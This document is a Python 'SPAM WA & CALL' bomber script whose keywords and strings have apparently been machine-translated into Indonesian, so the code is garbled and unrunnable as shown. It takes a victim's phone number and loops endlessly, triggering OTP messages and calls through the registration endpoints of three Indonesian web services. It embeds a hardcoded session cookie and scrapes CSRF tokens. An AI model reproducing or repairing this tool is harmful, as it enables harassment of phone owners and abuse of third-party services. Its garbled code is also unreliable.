import  os , sys , time , request , random , json , re
dari  permintaan  import  post                            
dari  waktu  tidur impor 

def  countdownTimer ( start_minute , start_second ):
    total_second  =  start_minute  *  60  +  start_second
    sedangkan  total_second :
        menit , detik  =  divmod ( total_second , 60 )
        cetak ( f ' \ r \ 033 [1; 97m [ \ 033 [1; 96m • \ 033 [1; 97m] Menunggu \ 033 [90m ... \ 033 [1; 97m { menit : 02d } : { detik : 02d } ' , end = ' ' , flush = True )
        waktu . tidur ( 1 )
        total_second  - =  1
def  wa ():
    ua = {
    "Host" : "bos.smartlink.id" ,                             
    "Sambungan" : "tetap hidup" ,
    "Terima" : "application / json, text / javascript, * / *; q = 0.01" ,
    "X-Diminta-Dengan" : "XMLHttpRequest" ,
    "User-Agent" : "Mozilla / 5.0 (Linux; Android 10; SM-A107F) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 83.0.4103.106 Mobile Safari / 537.36" ,
    "Jenis-Konten" : "application / x-www-form-urlencoded; charset = UTF-8" ,
    "Asal" : "https://bos.smartlink.id" ,
    "Referer" : "https://bos.smartlink.id/register" ,
    "Terima-Enkode" : "gzip, deflate, br" ,
    "Terima-Bahasa" : "id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7" ,
    "Cookie" : "laravel_session = eyJpdiI6IllaMDVxOEh0WGFtdEVnR1JWWE5NMGc9PSIsInZhbHVlIjoiUFAzWUZnTDJ4Q3pKM3R1U1k4VE1yV1oxZ1wvOThkQThQaVFJSlBrWnRqd0hHZFJidjhoMXlcL3lMd2VmTmlYWVdCIiwibWFjIjoiZGE4NjZkMjU2MWE4MzJiYzQ3MWI4Y2FkMDRiNzBmYWQzYTliYzgwYzY3MTg3MDc5Njc4YjgxMzVhYWZhNDFkNyJ9"
    }
    t = permintaan . dapatkan ( "https://bos.smartlink.id/register" ). teks
    token = re . temukan ( r "name = \" _ token \ "value = \" (. *?) \ "" , t ) [ 0 ]
    dat = {
    "idkaryawan" : "" ,
    "_token" : token ,
    "multiowner" : "false" ,
    "tiperegister" : "telp" ,
    "nama" : "Famztxt" ,
    "email" : "" ,
    "country_code" : "62" ,
    "nohp" : "" ,
    "telp" : tidak ,
    "sandi" : "tes1234" ,
    "ulangi_password" : "tes1234" ,
    "kota" : "3201" ,
    "kode_afiliator" : "" ,
    "resultOTP" : "" ,
    "whitelistid" : "" ,
    "otpvia" : "wa" ,
    "syarat_ketentuan" : "on" ,
    "otp" : ""
    }
    r = permintaan . post ( "https://bos.smartlink.id/checkRegister" , data = dat , headers = ua ). teks
    jika  "OTP Terkirim"  di  r :
        cetak ( f " \ 033 [1; 97m [ \ 033 [1; 92m + \ 033 [1; 97m] Spam Ke \ 033 [90m- \ 033 [1; 94m { no } \ 033 [90m- \ 033 [1; 92mSukses \ 033 [1; 97m [ \ 033 [1; 92m + \ 033 [1; 97m] " )
    lain :
        sys . keluar ( " \ 033 [1; 97m [ \ 033 [1; 91m × \ 033 [1; 97m] \ 033 [1; 91mLimit Bro \ 033 [00m" )
def  cal1 ():
    ua = {
    "Content-Type" : "application / json" ,
    "Host" : "srv3.sampingan.co.id" ,
    "Sambungan" : "Keep-Alive" ,
    "Terima-Enkode" : "gzip" ,
    "Agen-Pengguna" : "okhttp / 4.4.0"
    }
    dat = json . kesedihan ({ "countryCode" : "+62" , "phoneNumber" : no })
    r = permintaan . posting ( "https://srv3.sampingan.co.id/auth/generate-otp" , data = dat , headers = ua )
    jika  "Nomor tidak valid, cek kembali pengisian nomor anda"  di  r . teks :
        sys . keluar ( " \ 033 [1; 97m [ \ 033 [1; 91m × \ 033 [1; 97m] \ 033 [1; 91mLimit Bro \ 033 [00m" )
    lain :
        cetak ( f " \ 033 [1; 97m [ \ 033 [1; 92m + \ 033 [1; 97m] Spam Ke \ 033 [90m- \ 033 [1; 94m { no } \ 033 [90m- \ 033 [1; 92mSukses \ 033 [1; 97m [ \ 033 [1; 92m + \ 033 [1; 97m] " )
def  panggilan ():
    head  = {
    "X-Diminta-Dengan" : "XMLHttpRequest" ,
    "User-Agent" : "Mozilla / 5.0 (Linux; Android 9; SM-A107F) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 80.0.3987.162 Mobile Safari / 537.36" ,
    "Jenis-Konten" : "application / x-www-form-urlencoded; charset = UTF-8" ,
    "Content-Type" : "application / json" ,
    "Asal" : "https://id.jagreward.com" ,
    "Perujuk" : "https://id.jagreward.com/member/register/" ,
    "Terima-Enkode" : "gzip, deflate, br" ,
    "Terima-Bahasa" : "id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7"
    }
    r  =  permintaan . get ( "https://id.jagreward.com/member/verify-mobile/" + no + "/" , headers = head )
    mencetak
spanduk = "" "
        \ 033 [1; 97m SPAM WA & CALL
        \ 33 [90m --------------
\ 033 [1; 97m [ \ 033 [1; 96m! \ 033 [1; 97m] PENULIS: \ 033 [1; 96mGabriel.S
\ 033 [1; 97m [ \ 033 [1; 96m! \ 033 [1; 97m] YOUTUBE: \ 033 [1; 96mWinnerChannel
\ 033 [1; 97m [ \ 033 [1; 96m! \ 033 [1; 97m] GITHUB: \ 033 [4; 92mgithub.com/menang22 \ 033 [00m
_____________________________________ "" "
jika  __name__  ==  '__main__' :
    os . sistem ( "bersih" )
    cetak ( spanduk )
    cetak ( "       \ 033 [90m - \ 033 [1; 91mX \ 033 [90m- \ 033 [1; 97mCtrl + z untuk keluar \ 033 [90m- \ 033 [1; 91mX \ 033 [90m-" )
    no = input ( " \ 033 [1; 97m [ \ 033 [1; 96m • \ 033 [1; 97m] Tidak Ada Target \ 033 [90m ( \ 033 [1; 94m8 ×%% \ 033 [90m) \ 033" [ 1; 97m: \ 033 [1; 94m " )
    sementara  Benar :
        coba :
            panggilan ()
            tidur ( 2 )
            wa ()
            tidur ( 3 )
            cal1 ()
            tidur ( 2 )
            countdownTimer ( 2 , 00 )
            cetak ( " \ n " )
        kecuali  permintaan . pengecualian . ConnectionError :
               sys . keluar ( " \ 033 [1; 97m [ \ 033 [1; 91m × \ 033 [1; 97m \ 033 [1; 91mKoneksi Error !!" )
